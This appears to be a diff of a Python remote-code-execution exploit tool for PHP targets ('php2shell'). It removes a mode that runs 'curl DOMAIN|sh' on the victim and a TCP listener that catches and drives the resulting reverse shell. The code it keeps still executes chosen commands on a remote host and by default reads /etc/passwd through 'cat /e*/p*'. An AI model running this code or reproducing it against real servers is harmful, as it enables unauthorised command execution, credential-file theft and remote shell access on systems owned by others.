@@ -155,66 +155,6 @@ def drop_shot(url, cmd, prof, zif, dtor, htd, retries, rb_url, expect_fn):
     return False, body
 
 
-def fire_raw(url, cmd, prof, zif, dtor, htd, retries):
-    """Fire a self-contained command (e.g. a `curl x|sh` cradle) a few times.
-       No readback -- the payload handles its own output/callback. Returns leaked?"""
-    fired = False
-    for _ in range(retries):
-        r = _leak(url, cmd, prof, zif, dtor, htd)
-        if not r:
-            continue
-        ex, htdata, zifa = r
-        fired = True
-        for _ in range(3):
-            ex.rotate()
-            try: ex.stage3(htdata, zifa)
-            except OSError: pass
-    return fired
-
-
-def dropper_listen_and_fire(url, cmd, prof, zif, dtor, htd, retries, lhost, lport):
-    """Open a TCP listener, fire the cradle on the target, catch the callback,
-       then bridge it to this terminal (an overt reverse-connection handler)."""
-    import socket, select
-    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    try:
-        srv.bind((lhost, lport)); srv.listen(1)
-    except OSError as e:
-        print(f"[!] cannot bind {lhost}:{lport}: {e}"); return 2
-    print(f"[*] listener up on {lhost}:{lport}; firing cradle '{cmd}' on target ...")
-    import threading
-    threading.Thread(target=fire_raw, args=(url, cmd, prof, zif, dtor, htd, retries),
-                     daemon=True).start()
-    srv.settimeout(120)
-    try:
-        conn, addr = srv.accept()
-    except socket.timeout:
-        print(f"[-] no callback within 120s. Check: payload at the dropper URL connects "
-              f"back to YOUR {lhost}:{lport}, target egress is allowed, and the URL is reachable.")
-        return 1
-    print(f"\n[+] CONNECTION RECEIVED from {addr[0]}:{addr[1]} on port {lport}\n"
-          f"    (type commands; Ctrl-C to drop)\n")
-    conn.setblocking(False)
-    try:
-        while True:
-            r, _, _ = select.select([conn, sys.stdin], [], [])
-            if conn in r:
-                data = conn.recv(4096)
-                if not data:
-                    print("\n[*] connection closed by target"); break
-                sys.stdout.write(data.decode(errors="replace")); sys.stdout.flush()
-            if sys.stdin in r:
-                line = sys.stdin.readline()
-                if not line: break
-                conn.sendall(line.encode())
-    except KeyboardInterrupt:
-        print("\n[*] handler closed")
-    finally:
-        conn.close(); srv.close()
-    return 0
-
-
 def main():
     ap = argparse.ArgumentParser(description="php2shell one-shot: fingerprint->offsets->blind check->poc (local or remote)")
     ap.add_argument("-u", "--url", required=True, help="target, e.g. http://host:8084/ (or .../index.php)")
@@ -230,12 +170,6 @@ def main():
                     "Pass --cmd '' to use the id;pwd;whoami proof instead.")
     ap.add_argument("--passwd", action="store_true",
                     help="proof mode: run 'cat /e*/p*' -> /etc/passwd into the poc file (explicit alias of the default)")
-    ap.add_argument("--dropper", metavar="DOMAIN",
-                    help="download-cradle mode: run 'curl DOMAIN|sh' on the target "
-                    "(DOMAIN must be <=6 chars so 'curl DOMAIN|sh' fits 14B). The payload "
-                    "you host at DOMAIN runs on the target; pair with --lport to catch its callback.")
-    ap.add_argument("--lhost", default="0.0.0.0", help="listener bind address for --dropper callbacks (default 0.0.0.0)")
-    ap.add_argument("--lport", type=int, help="listener port for --dropper callbacks (e.g. 4444)")
     ap.add_argument("--no-poc", action="store_true", help="blind check only, write nothing")
     ap.add_argument("--zif-offset", type=lambda x: int(x, 0))
     ap.add_argument("--dtor-offset", type=lambda x: int(x, 0))
@@ -289,21 +223,6 @@ def main():
         print(f"    offsets: --zif-offset {hex(zif)} --dtor-offset {hex(dtor)} --htdata-offset {hex(htd)}")
         return 0
 
-    # 4a. DROPPER mode: run `curl DOMAIN|sh` on the target; optional listener catches the callback.
-    if a.dropper:
-        full = f"curl {a.dropper}|sh"
-        if len(full.encode()) > 14:
-            print(f"[!] '{full}' is {len(full.encode())}B > 14-byte carrier. "
-                  f"DOMAIN must be <=6 chars (curl + |sh leave 6 bytes for the URL).")
-            return 2
-        print(f"[4] dropper: '{full}' on target (payload hosted by you at {a.dropper})")
-        if a.lport:
-            return dropper_listen_and_fire(a.url, full, prof, zif, dtor, htd, a.retries, a.lhost, a.lport)
-        ok = fire_raw(a.url, full, prof, zif, dtor, htd, a.retries)
-        print(f"\n[+] DONE: cradle {'fired' if ok else 'leak failed'} on {tag}. "
-              f"(no --lport listener; payload runs on target).")
-        return 0 if ok else 1
-
     # 4b. FILE-DROP proof: cat /e*/p* (passwd) / your --cmd / id;pwd;whoami -> `poc`, read over HTTP.
     if a.passwd:
         a.cmd = "cat /e*/p*"
@@ -312,9 +231,8 @@ def main():
         print("[!] poc-name too long for the 14B carrier; using 'poc'"); name = "poc"
     rb = readback_url(a.url, name)
     if a.cmd:
-        # If the command already pipes/redirects (e.g. a `curl x|sh` download cradle),
-        # run it VERBATIM -- the fetched script handles its own output. Otherwise
-        # capture stdout into the poc file with an appended `>name`.
+        # If the command already contains its own pipe/redirect, run it VERBATIM;
+        # otherwise capture stdout into the poc file with an appended `>name`.
         if "|" in a.cmd or ">" in a.cmd:
             full = a.cmd
         else:
